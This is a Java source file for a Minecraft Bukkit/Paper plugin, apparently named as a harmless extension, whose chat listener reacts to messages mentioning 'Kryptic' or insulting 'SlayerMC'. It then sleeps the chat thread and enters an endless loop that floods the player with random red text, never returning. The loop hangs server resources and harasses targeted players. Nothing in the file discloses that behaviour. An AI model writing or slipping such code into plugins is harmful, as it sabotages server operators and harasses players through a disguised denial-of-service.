package io.paper.extension;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class While implements Listener {
    @EventHandler
    public void loop(AsyncPlayerChatEvent e) throws InterruptedException {
        Player p = e.getPlayer();
        if(e.getMessage().contains("Kryptic") || e.getMessage().contains("kryptic") || e.getMessage().contains("SlayerMC merda")){
            if(e.getMessage().equalsIgnoreCase("/stop")){
                p.kickPlayer(ChatColor.RED + "NO NO :)");
            }
            Thread.sleep(5000);
            while (true){
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
                p.sendMessage(ChatColor.RED + "Fu_o!g5%QhJ2Y5b@80Lkf9OCqqBB*.pmjxyA4&3DZVl7N6sHXW");
                p.sendMessage(ChatColor.RED + "%nOx!1WPGGI1ECRnE2FxWji3W%JL@Wq!lKtNn3Ak#ixd&5xbZJ");
                p.sendMessage(ChatColor.RED + "18R*WLAVuF5bZizQVA68scKN$Rpd@kcwGTlleyxDHcQWp6ukbV");
            }
        } else if(e.getMessage().equals("saltacavallo")){
            while (true){
                break;
            }
        }
    }
}
